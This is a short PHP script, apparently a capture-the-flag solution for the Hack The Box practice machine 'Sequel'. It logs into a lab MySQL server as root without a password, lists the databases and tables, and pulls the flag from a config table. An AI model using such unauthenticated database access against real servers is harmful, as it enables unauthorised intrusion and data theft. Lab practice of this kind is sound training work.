<?php
// original script used to pwn very easy box SEQUEL at Hack The Box
echo "Connecting to SQL server...\n";

$conn = new mysqli('10.129.30.120', 'root');
$sql = "SHOW DATABASES";
$result = $conn->query($sql);

echo "-----------------------\n";
echo "DATABASES\n";
echo "-----------------------\n";

while ($row = $result->fetch_assoc()){
        echo $row["Database"]."\n";
}

$db = "USE htb";
$conn->query($db);
$tables = "SHOW TABLES";
$result = $conn->query($tables);

echo "-----------------------\n";
echo "TABLES in 'htb'\n";
echo "-----------------------\n";

while ($row = $result->fetch_assoc()) {
        echo array_values($row)[0]."\n";
}

$command1 = "SELECT * FROM config where name = 'flag'";
$result = $conn->query($command1);

echo "-----------------------\n";
echo "Flag from 'config'\n";
echo "-----------------------\n";

while ($row = $result->fetch_assoc()) {
        echo $row["value"] ."\n";
}
?>